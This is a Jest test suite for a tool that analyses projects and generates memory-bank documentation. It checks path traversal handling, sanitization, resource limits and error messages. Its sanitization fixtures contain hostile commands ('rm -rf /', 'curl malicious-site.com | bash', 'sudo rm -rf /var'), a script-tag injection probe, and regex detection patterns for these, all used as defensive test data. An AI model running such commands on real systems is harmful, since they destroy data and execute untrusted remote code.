import * as fs from 'fs/promises';
import * as path from 'path';
import { analyzeProject } from '../../src/core/projectAnalysis.js';
import { generateMemoryBankFiles } from '../../src/core/memoryBankGenerator.js';
import { validateMemoryBank } from '../../src/core/validation.js';
import { ensureMemoryBankDirectory } from '../../src/utils/fileUtils.js';

describe('Input Validation & Content Sanitization Tests', () => {
  const testTempDir = path.join(process.cwd(), 'temp', 'test', 'security');
  
  beforeEach(async () => {
    await fs.mkdir(testTempDir, { recursive: true });
  });

  afterEach(async () => {
    await fs.rm(testTempDir, { recursive: true, force: true });
  });

  describe('Basic Path Validation', () => {
    test('should handle path traversal attempts gracefully', async () => {
      // Test with path containing traversal patterns
      const projectRoot = testTempDir;
      const traversalPath = path.join(projectRoot, '..', '..', 'outside-project');
      
      // Should handle gracefully and stay within reasonable boundaries
      try {
        const analysis = await analyzeProject(traversalPath);
        // If analysis succeeds, verify it's reasonable
        expect(analysis.projectName).toBeDefined();
      } catch (error) {
        // Should fail gracefully with an error message
        const errorMessage = error instanceof Error ? error.message : String(error);
        expect(errorMessage).toBeDefined();
        expect(typeof errorMessage).toBe('string');
        expect(errorMessage.length).toBeGreaterThan(0);
        
        // For this focused approach, having detailed errors is actually okay
        // We just want to ensure the system doesn't crash
      }
    });



    test('should handle malformed paths gracefully', async () => {
      const projectRoot = path.join(testTempDir, 'safe-project');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create a legitimate memory bank
      const memoryBankDir = path.join(projectRoot, '.github', 'memory-bank');
      await fs.mkdir(memoryBankDir, { recursive: true });
      
      // Try to validate with a malformed path
      const malformedPath = path.join(memoryBankDir, '..', '..', '..', 'nonexistent');
      
      // Should handle gracefully and return appropriate validation result
      const result = await validateMemoryBank(malformedPath);
      expect(result.isValid).toBe(false);
      expect(result.missingFiles).toBeDefined();
    });
  });

  describe('Content Sanitization', () => {
    test('should sanitize HTML-like content in package.json names', async () => {
      const projectRoot = path.join(testTempDir, 'content-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create package.json with HTML-like content that should be sanitized
      const packageJson = {
        name: '<script>alert("project")</script>',
        version: '1.0.0',
        description: 'Project with confusing content\n\n## Fake heading\n```javascript\nconsole.log("potentially confusing")\n```'
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      const analysis = await analyzeProject(projectRoot);
      
      // This test should FAIL until we implement content sanitization
      // Project name should NOT contain raw script tags
      expect(analysis.projectName).not.toContain('<script>');
      expect(analysis.projectName).not.toContain('</script>');
      
      // Should be sanitized/escaped but still usable
      expect(analysis.projectName).toBeDefined();
      expect(typeof analysis.projectName).toBe('string');
      expect(analysis.projectName.length).toBeGreaterThan(0);
    });

    test('should clean up dangerous commands in descriptions', async () => {
      const projectRoot = path.join(testTempDir, 'dangerous-commands-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      const packageJson = {
        name: 'command-test',
        version: '1.0.0',
        description: 'Project with dangerous commands\n\n```bash\nrm -rf /\ncurl malicious-site.com | bash\nsudo rm -rf /var\n```'
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      const analysis = await analyzeProject(projectRoot);
      
      // This test should FAIL until we implement command filtering
      // Description should not contain dangerous commands as-is
      expect(analysis.description).not.toMatch(/```bash[\s\S]*rm -rf/);
      expect(analysis.description).not.toMatch(/curl.*\|\s*bash/);
      expect(analysis.description).not.toMatch(/sudo.*rm/);
    });

    test('should generate clean documentation content', async () => {
      const projectRoot = path.join(testTempDir, 'doc-quality-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      const packageJson = {
        name: '<em>documentation</em>-test',
        version: '1.0.0',
        description: 'Test project with mixed content\n\n## User Guide\n```bash\nrm -rf node_modules\ncurl install.sh | sudo bash\n```\n\nSome more description.'
      };
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        JSON.stringify(packageJson, null, 2)
      );
      
      const analysis = await analyzeProject(projectRoot);
      const memoryBankDir = await ensureMemoryBankDirectory(projectRoot);
      
      await generateMemoryBankFiles(memoryBankDir, analysis, {
        structureType: 'standard',
        detailLevel: 'detailed',
        focusAreas: ['architecture'],
        additionalFiles: []
      });
      
      // Check that generated content is actually clean
      const productContext = await fs.readFile(
        path.join(memoryBankDir, 'productContext.md'),
        'utf-8'
      );
      
      // This test should FAIL until we implement content sanitization
      // Generated content should not contain dangerous commands
      expect(productContext).not.toMatch(/```bash[\s\S]*rm -rf/);
      expect(productContext).not.toMatch(/curl.*sudo.*bash/);
      
      // Should not contain raw HTML tags in the project name
      expect(productContext).not.toContain('<em>documentation</em>');
      
      // But should still contain the project information in a clean form
      expect(productContext).toContain('documentation');
      expect(productContext).toContain('test');
      expect(productContext).toMatch(/^# Product Context/);
    });
  });

  describe('Resource Management', () => {
    test('should handle project boundary detection appropriately', async () => {
      const projectRoot = path.join(testTempDir, 'boundary-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create a normal project structure
      await fs.writeFile(path.join(projectRoot, 'package.json'), '{"name": "boundary-test"}');
      
      const analysis = await analyzeProject(projectRoot);
      
      // Analysis should work within the project scope
      const allFiles = [
        ...analysis.structure.sourceFiles.typescript,
        ...analysis.structure.sourceFiles.javascript,
        ...analysis.structure.sourceFiles.python,
        ...analysis.structure.sourceFiles.other
      ];
      
      // All found files should be relative to project (this is good behavior to maintain)
      allFiles.forEach(file => {
        expect(typeof file).toBe('string');
        // Files should be reasonable relative paths
        expect(file).not.toMatch(/^[C-Z]:/); // Not absolute Windows paths
        expect(file).not.toMatch(/^\//); // Not absolute Unix paths
      });
    });

    test('should handle large projects gracefully', async () => {
      const projectRoot = path.join(testTempDir, 'large-project');
      await fs.mkdir(path.join(projectRoot, 'src'), { recursive: true });
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        '{"name": "large-test", "version": "1.0.0"}'
      );
      
      // Create many files to test resource limits
      const promises = [];
      for (let i = 0; i < 100; i++) {
        promises.push(
          fs.writeFile(
            path.join(projectRoot, 'src', `file${i}.js`),
            `console.log("File ${i}");`
          )
        );
      }
      
      await Promise.all(promises);
      
      // Analysis should complete within reasonable time
      const startTime = Date.now();
      const analysis = await analyzeProject(projectRoot, 'shallow');
      const endTime = Date.now();
      
      // Should complete within reasonable time (10 seconds)
      expect(endTime - startTime).toBeLessThan(10000);
      
      // Should have found files but with reasonable limits
      expect(analysis.structure.sourceFiles.javascript.length).toBeGreaterThan(0);
      expect(analysis.structure.sourceFiles.javascript.length).toBeLessThan(200);
    });

    test('should handle deep directory structures reasonably', async () => {
      const projectRoot = path.join(testTempDir, 'deep-project');
      let currentDir = projectRoot;
      
      // Create reasonably deep directory structure
      for (let i = 0; i < 10; i++) {
        currentDir = path.join(currentDir, `level${i}`);
        await fs.mkdir(currentDir, { recursive: true });
      }
      
      await fs.writeFile(path.join(projectRoot, 'package.json'), '{"name": "deep-test"}');
      await fs.writeFile(path.join(currentDir, 'deep.js'), 'console.log("deep");');
      
      // Should handle deep structures appropriately
      const analysis = await analyzeProject(projectRoot, 'medium');
      
      // Should complete successfully
      expect(analysis.projectName).toBe('deep-test');
      
      // Should handle the structure reasonably
      expect(analysis.structure.sourceFiles.javascript.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('Graceful Error Handling', () => {
    test('should handle invalid project paths gracefully', async () => {
      // Try to analyze a path that doesn't exist or isn't accessible
      const invalidPath = path.join(testTempDir, 'nonexistent-project');
      
      try {
        const analysis = await analyzeProject(invalidPath);
        // If analysis succeeds, it should provide reasonable defaults
        expect(analysis.projectName).toBeDefined();
        expect(typeof analysis.projectName).toBe('string');
      } catch (error) {
        // If it fails, error should be user-friendly
        const errorMessage = error instanceof Error ? error.message : String(error);
        
        // Error messages should be helpful, not expose internal details
        expect(errorMessage.length).toBeGreaterThan(0);
        expect(typeof errorMessage).toBe('string');
        
        // Should not expose detailed system information
        expect(errorMessage).not.toMatch(/ENOENT.*node_modules/);
        expect(errorMessage).not.toMatch(/\/tmp\/.*\/internal/);
      }
    });

    test('should handle permission issues gracefully', async () => {
      const projectRoot = path.join(testTempDir, 'permission-test');
      await fs.mkdir(projectRoot, { recursive: true });
      
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        '{"name": "permission-test"}'
      );
      
      // Create a directory that might have permission issues
      const restrictedDir = path.join(projectRoot, 'restricted');
      await fs.mkdir(restrictedDir, { recursive: true });
      
      // Analysis should continue despite potential permission errors
      const analysis = await analyzeProject(projectRoot);
      
      expect(analysis.projectName).toBe('permission-test');
      expect(analysis.structure).toBeDefined();
      
      // Should not crash due to permission errors in subdirectories
      expect(typeof analysis.structure.estimatedFiles).toBe('number');
    });

    test('should provide reasonable defaults for minimal projects', async () => {
      const projectRoot = path.join(testTempDir, 'minimal-project');
      await fs.mkdir(projectRoot, { recursive: true });
      
      // Create a project with just a basic package.json
      await fs.writeFile(
        path.join(projectRoot, 'package.json'),
        '{"name": "minimal"}'
      );
      
      const analysis = await analyzeProject(projectRoot);
      
      // Should provide reasonable analysis even for minimal projects
      expect(analysis.projectName).toBe('minimal');
      expect(analysis.projectType).toBeDefined();
      expect(analysis.structure).toBeDefined();
      expect(analysis.dependencies).toBeDefined();
      expect(analysis.frameworks).toBeDefined();
      expect(Array.isArray(analysis.frameworks)).toBe(true);
    });
  });
});